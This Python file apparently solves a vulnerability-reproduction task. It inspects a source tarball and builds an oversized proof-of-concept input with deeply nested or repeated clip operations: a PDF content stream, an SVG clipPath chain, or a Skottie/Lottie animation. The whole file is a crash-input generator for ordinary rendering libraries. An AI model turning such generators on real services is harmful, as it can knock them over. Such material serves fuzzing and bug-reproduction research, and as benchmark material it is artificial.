import os
import tarfile
import io
import re
import json
from typing import List, Optional


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Try to detect project and fuzzer type from the source tarball
        proj_type = self._detect_project_type(src_path)
        if proj_type == "skottie":
            # Generate Skottie JSON with deep mask/matte nesting
            return self._generate_skottie_json(target_len=913919)
        elif proj_type == "svg":
            # Generate deeply nested SVG clip paths/groups
            return self._generate_svg_clip(target_len=913919)
        else:
            # Default to PDF generator with massive clip pushes
            return self._generate_pdf_clip(target_len=913919)

    def _detect_project_type(self, src_path: str) -> str:
        # Returns one of: "skottie", "svg", "pdf"
        # Default: "pdf"
        try:
            if not src_path or not os.path.exists(src_path):
                return "pdf"

            # Heuristics from filenames
            lower_names = []
            fuzzer_hints = []
            skottie_hint = False
            svg_hint = False
            pdf_hint = False

            with tarfile.open(src_path, "r:*") as tf:
                members = tf.getmembers()
                limit = 1200  # limit scanning to avoid heavy IO
                count = 0
                for m in members:
                    if not m.isfile():
                        continue
                    name_l = m.name.lower()
                    lower_names.append(name_l)
                    if any(x in name_l for x in ("skottie", "modules/skottie", "tools/fuzz", "fuzz")):
                        fuzzer_hints.append(m)
                    if "skia" in name_l or "skottie" in name_l:
                        skottie_hint = True
                    if "svg" in name_l or "librsvg" in name_l or "resvg" in name_l or "/svg" in name_l:
                        svg_hint = True
                    if "pdfium" in name_l or "poppler" in name_l or "mupdf" in name_l or "qpdf" in name_l or "/pdf" in name_l or "pdf/" in name_l:
                        pdf_hint = True

                    count += 1
                    if count >= limit:
                        break

                # Parse potential fuzzer files for more precise hints
                fcount = 0
                for fm in fuzzer_hints:
                    if fm.size > 2_000_000:
                        continue
                    try:
                        with tf.extractfile(fm) as f:
                            if not f:
                                continue
                            data = f.read(1000000)
                            text = None
                            try:
                                text = data.decode("utf-8", errors="ignore")
                            except Exception:
                                text = None
                            if not text:
                                continue
                            if "LLVMFuzzerTestOneInput" in text:
                                if "skottie" in text or "Skottie" in text:
                                    return "skottie"
                                if re.search(r'\bsvg\b', text, re.IGNORECASE):
                                    svg_hint = True
                                if re.search(r'\bpdf\b', text, re.IGNORECASE) or "pdfium" in text.lower() or "mupdf" in text.lower() or "poppler" in text.lower():
                                    pdf_hint = True
                    except Exception:
                        pass
                    fcount += 1
                    if fcount > 25:
                        break

            if skottie_hint:
                return "skottie"
            if svg_hint and not pdf_hint:
                return "svg"
            if pdf_hint:
                return "pdf"
            # default
            return "pdf"
        except Exception:
            return "pdf"

    def _generate_pdf_clip(self, target_len: int = 913919) -> bytes:
        # Build a minimal well-formed PDF with a single page and a content stream
        # with massive consecutive clip operations that do not require save/restore.
        # The content includes a small path followed by 'W n' repeated many times.
        # Build content stream approximately target_len size

        # One path + clip pair. Using a small, valid rectangle.
        # "m" move to; "l" line to; "h" closepath; "W" clip; "n" end path
        base_cmd = b"0 0 m 1 0 l 1 1 l 0 1 l h W n\n"
        # Build content as repeated base_cmd
        # We'll also interleave some 'q'/'Q' pairs sparsely to exercise stack logic
        q_pair = b"q\nQ\n"
        # Compose content to meet target size approximately
        content = io.BytesIO()
        header_boost = 1024  # reserve for PDF structure overhead
        repetitions = max(1, (target_len - header_boost) // len(base_cmd))
        # To avoid extremely long chains of only W n, add periodic q/Q pairs
        period = 97  # a prime-ish number to avoid regularity
        for i in range(repetitions):
            content.write(base_cmd)
            if i % period == 0:
                content.write(q_pair)

        content_bytes = content.getvalue()

        # Build the PDF structure
        header = b"%PDF-1.7\n%\xE2\xE3\xCF\xD3\n"
        objects: List[bytes] = []

        # 1 0 obj: Catalog
        obj1 = b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        objects.append(obj1)

        # 2 0 obj: Pages
        obj2 = b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        objects.append(obj2)

        # 3 0 obj: Page
        obj3 = (b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
                b"/Resources << >> /Contents 4 0 R >>\nendobj\n")
        objects.append(obj3)

        # 4 0 obj: Contents stream
        stream_prefix = b"4 0 obj\n<< /Length "
        length_str = str(len(content_bytes)).encode("ascii")
        stream_mid = b" >>\nstream\n"
        stream_suffix = b"endstream\nendobj\n"
        obj4 = stream_prefix + length_str + stream_mid + content_bytes + stream_suffix
        objects.append(obj4)

        # Assemble and compute xref offsets
        parts = [header]
        offsets = [0]  # object 0 is free object
        current_offset = len(header)
        for obj in objects:
            offsets.append(current_offset)
            parts.append(obj)
            current_offset += len(obj)

        xref_offset = current_offset
        # Build xref table
        xref = io.BytesIO()
        xref.write(b"xref\n")
        xref.write(b"0 5\n")
        # free object 0
        xref.write(b"0000000000 65535 f \n")
        for i in range(1, 5):
            off = offsets[i]
            xref.write(("{:010d} 00000 n \n".format(off)).encode("ascii"))

        # trailer and EOF
        trailer = b"trailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n" + str(xref_offset).encode("ascii") + b"\n%%EOF\n"

        pdf_bytes = b"".join(parts) + xref.getvalue() + trailer

        # If we're too short relative to target, pad the content stream by appending harmless comments
        if len(pdf_bytes) < target_len:
            pad_needed = target_len - len(pdf_bytes)
            # Comments inside streams are allowed; rebuild with padded content length
            pad = b"%" + b"A" * max(0, pad_needed)
            content_bytes_padded = content_bytes + pad
            obj4 = stream_prefix + str(len(content_bytes_padded)).encode("ascii") + stream_mid + content_bytes_padded + stream_suffix

            # Reassemble with padded stream to keep xref correct
            parts = [header]
            offsets = [0]
            current_offset = len(header)
            for obj in [obj1, obj2, obj3, obj4]:
                offsets.append(current_offset)
                parts.append(obj)
                current_offset += len(obj)
            xref_offset = current_offset
            xref = io.BytesIO()
            xref.write(b"xref\n")
            xref.write(b"0 5\n")
            xref.write(b"0000000000 65535 f \n")
            for i in range(1, 5):
                off = offsets[i]
                xref.write(("{:010d} 00000 n \n".format(off)).encode("ascii"))
            trailer = b"trailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n" + str(xref_offset).encode("ascii") + b"\n%%EOF\n"
            pdf_bytes = b"".join(parts) + xref.getvalue() + trailer

        return pdf_bytes

    def _generate_svg_clip(self, target_len: int = 913919) -> bytes:
        # Build an SVG with very deep nested clipPaths and groups to push clip stack depth.
        # Construct <defs> with chained clipPaths c0->c1->... and nested <g> elements applying them.
        header = b'<?xml version="1.0" encoding="UTF-8"?>\n'
        svg_open_prefix = '<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100">'.encode()
        defs_open = b"<defs>\n"
        defs_close = b"</defs>\n"

        # Generate chained clipPaths
        # Each clipPath references the previous via clip-path property, creating a deep nested chain.
        base_clip = '<clipPath id="c{}"{}><rect x="0" y="0" width="100" height="100"/></clipPath>\n'

        defs = io.BytesIO()
        defs.write(defs_open)

        # Estimate count based on target length
        single_len = len(base_clip.format(0, "").encode())
        # Add extra attribute each time to increase size and stress parser
        chain_count = max(100, (target_len - 1000) // max(1, single_len))

        for i in range(chain_count):
            if i == 0:
                attr = ""
            else:
                # Each subsequent clipPath references the previous one, nesting the clipping
                attr = f' clip-path="url(#c{i-1})"'
            defs.write(base_clip.format(i, attr).encode())

        defs.write(defs_close)

        # Build nested groups applying successive clip-paths
        nested_groups = io.BytesIO()
        # We'll open many <g> tags with clip-paths, then fill one rect, then close them.
        for i in range(chain_count):
            nested_groups.write(f'<g clip-path="url(#c{i})">'.encode())
        nested_groups.write(b'<rect x="0" y="0" width="100" height="100" fill="black"/>')
        for _ in range(chain_count):
            nested_groups.write(b'</g>')

        svg_close = b"</svg>\n"
        assembled = header + svg_open_prefix + b"\n" + defs.getvalue() + nested_groups.getvalue() + b"\n" + svg_close

        # Pad with comments if shorter than target
        if len(assembled) < target_len:
            pad_needed = target_len - len(assembled)
            assembled += b"<!--" + b"A" * pad_needed + b"-->"

        return assembled

    def _generate_skottie_json(self, target_len: int = 913919) -> bytes:
        # Build a Lottie (Skottie) JSON with many layers and masks, and alternating matte (tt) to stress
        # the layer/clip stack. Try to approach target length.
        # Base minimal layer templates
        def ks_transform():
            return {
                "o": {"a": 0, "k": 100},
                "r": {"a": 0, "k": 0},
                "p": {"a": 0, "k": [256, 256, 0]},
                "a": {"a": 0, "k": [0, 0, 0]},
                "s": {"a": 0, "k": [100, 100, 100]},
            }

        def rect_shape():
            return {
                "ty": "rc",
                "d": 1,
                "s": {"a": 0, "k": [512, 512]},
                "p": {"a": 0, "k": [256, 256]},
                "r": {"a": 0, "k": 0},
            }

        def mask_obj(i):
            # Animated opacity and path to increase complexity
            return {
                "inv": False,
                "mode": "a",
                "pt": {
                    "a": 0,
                    "k": {
                        "i": [[0, 0], [0, 0], [0, 0]],
                        "o": [[0, 0], [0, 0], [0, 0]],
                        "v": [[0, 0], [512, 0], [512, 512]],
                        "c": True,
                    },
                },
                "o": {"a": 0, "k": 100 if (i % 2 == 0) else 50},
                "x": {"a": 0, "k": 0},
            }

        # Build many layers with masks and alternating matte (tt)
        layers: List[dict] = []
        approx_layer_size = 450  # rough heuristic
        num_layers = max(2, target_len // approx_layer_size // 2 * 2)  # Ensure even number for matte pairing
        num_layers = min(num_layers, 4000)  # Bound to avoid extremely large output
        masks_per_layer = 2

        ind = 1
        for i in range(num_layers):
            layer = {
                "ddd": 0,
                "ind": ind,
                "ty": 4,
                "nm": f"L{i}",
                "sr": 1,
                "ks": ks_transform(),
                "ao": 0,
                "shapes": [
                    rect_shape(),
                    {"ty": "fl", "c": {"a": 0, "k": [1, 0, 0, 1]}, "o": {"a": 0, "k": 100}, "r": 1},
                    {"ty": "tr", "p": {"a": 0, "k": [0, 0]}, "a": {"a": 0, "k": [0, 0]}, "s": {"a": 0, "k": [100, 100]}, "r": {"a": 0, "k": 0}, "o": {"a": 0, "k": 100}, "sk": {"a": 0, "k": 0}, "sa": {"a": 0, "k": 0}}
                ],
                "ip": 0,
                "op": 60,
                "st": 0,
                "bm": 0,
            }
            # Add multiple masks to push clip operations
            layer["masksProperties"] = [mask_obj(j) for j in range(masks_per_layer)]
            # Alternate matte mode to force additional layer/clip interactions
            if i % 2 == 0:
                layer["tt"] = 1  # Alpha matte
            layers.append(layer)
            ind += 1

        root = {
            "v": "5.6.10",
            "fr": 30,
            "ip": 0,
            "op": 60,
            "w": 512,
            "h": 512,
            "nm": "PoC",
            "ddd": 0,
            "assets": [],
            "layers": layers,
        }

        # Serialize without spaces to control length
        data = json.dumps(root, separators=(",", ":")).encode("utf-8")

        # Pad to target length if needed with a harmless JSON string field in assets
        if len(data) < target_len:
            pad_len = target_len - len(data)
            # Append a long asset with a name field to increase size
            # Rebuild JSON with an asset that holds padding string
            pad_str = "A" * max(0, pad_len - 64)
            root["assets"].append({"id": "pad", "p": pad_str})
            data = json.dumps(root, separators=(",", ":")).encode("utf-8")
            # If still shorter (due to JSON overhead), pad with spaces inside the padding string length
            if len(data) < target_len:
                extra = target_len - len(data)
                pad_str += "B" * extra
                root["assets"][-1]["p"] = pad_str
                data = json.dumps(root, separators=(",", ":")).encode("utf-8")

        return data
